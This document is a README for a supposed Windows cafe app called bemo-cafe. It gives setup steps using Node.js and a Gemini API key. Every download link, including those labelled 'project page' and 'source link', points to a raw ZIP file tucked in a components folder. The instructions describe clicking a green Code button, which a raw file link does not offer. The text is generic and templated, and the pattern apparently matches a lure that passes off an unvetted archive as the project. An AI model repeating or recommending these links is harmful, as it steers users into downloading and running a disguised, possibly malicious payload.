# ☕ bemo-cafe - Run Your Cafe App Locally

[![Download and run the app](https://img.shields.io/badge/Download%20bemo--cafe-4b8cff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip)

## 🌟 What bemo-cafe is

bemo-cafe is a cafe app you can run on your Windows computer. It is built to help you view and use the app from your own device.

This project includes the files you need to set up the app on your computer and run it locally.

## 📥 Download bemo-cafe

Use this link to visit the page and download or copy the files you need:

[https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip](https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip)

## 🖥️ What you need on Windows

Before you start, install these basics on your Windows PC:

- Windows 10 or Windows 11
- Google Chrome or Microsoft Edge
- Node.js
- A stable internet connection
- A Gemini API key

Node.js lets the app run on your computer. The Gemini API key lets the app connect to Gemini services.

## 🚀 Getting Started

Follow these steps in order.

### 1. Download the project

1. Open this page:
   [https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip](https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip)
2. Click the green **Code** button
3. Select **Download ZIP**
4. Save the file to a folder you can find, such as **Downloads**
5. Right-click the ZIP file and choose **Extract All**

After extraction, you will see a folder named `bemo-cafe`

### 2. Install Node.js

1. Go to the Node.js website
2. Download the **LTS** version for Windows
3. Open the installer
4. Follow the setup steps
5. Finish the install

If Windows asks to restart, restart your PC before you move on

### 3. Open the project folder

1. Open the `bemo-cafe` folder you extracted
2. Find the file area where the project files are stored
3. Click the address bar in File Explorer
4. Type `cmd` and press **Enter**

This opens Command Prompt in the project folder

### 4. Install the app files

In Command Prompt, type this command and press **Enter**:

`npm install`

This step downloads the files the app needs to run

### 5. Add your Gemini API key

The app needs your Gemini API key to work.

1. In the project folder, find the file named `.env.local`
2. Open it with Notepad
3. Add this line:

`GEMINI_API_KEY=your_api_key_here`

4. Replace `your_api_key_here` with your real Gemini API key
5. Save the file

If the file does not exist, create a new file named `.env.local`

### 6. Start the app

In Command Prompt, type this command and press **Enter**:

`npm run dev`

Wait for the app to finish starting. Then open the link shown in Command Prompt, which is usually:

`http://localhost:3000`

## 🪟 Run the app on Windows

Once the app starts:

1. Keep Command Prompt open
2. Open your web browser
3. Go to the local address shown in the terminal
4. Use the app in your browser

If you close Command Prompt, the app stops

## 🔧 Helpful setup tips

- Use a folder path with no special characters
- Keep the `.env.local` file in the project root
- Make sure Node.js finished installing before you run `npm install`
- Use the same Command Prompt window for the setup steps
- If you move the project folder, run `npm install` again

## 📌 Main files you may use

These are the key parts of the project:

- `.env.local` — stores your API key
- `package.json` — lists the app commands and needed files
- `node_modules` — holds installed packages after setup
- project source files — run the app and show the interface

## 🧭 What the app does

bemo-cafe gives you a local app view in your browser. It is designed for use with AI Studio and uses your Gemini API key to connect the app to the service it needs.

You can use it to:

- open the app on your Windows PC
- run the app in a browser
- test the app from your own machine
- keep the project files in one place

## 🛠️ Common problems

### `npm` is not recognized

This usually means Node.js is not installed, or the install did not finish.

Fix:

1. Install Node.js again
2. Close Command Prompt
3. Open a new Command Prompt window
4. Run `npm install` again

### The app does not start

Check these items:

- The `.env.local` file exists
- `GEMINI_API_KEY` is set
- `npm install` finished without errors
- You ran `npm run dev` in the project folder

### The browser does not open

If the browser does not open on its own:

1. Copy the local address shown in Command Prompt
2. Paste it into Chrome or Edge
3. Press **Enter**

### The app shows an API key error

This means the Gemini API key may be missing or wrong.

Fix:

1. Open `.env.local`
2. Check the key name
3. Make sure it reads `GEMINI_API_KEY=`
4. Paste the correct key after the equals sign
5. Save the file and restart the app

## 🧩 Simple start checklist

- Download the project
- Install Node.js
- Open the project folder
- Run `npm install`
- Add your Gemini API key
- Run `npm run dev`
- Open the local link in your browser

## 📂 Folder view after setup

Your folder may look like this:

- `bemo-cafe`
- `.env.local`
- `package.json`
- `node_modules`
- source files for the app

## 📎 Source link

Project page:
[https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip](https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip)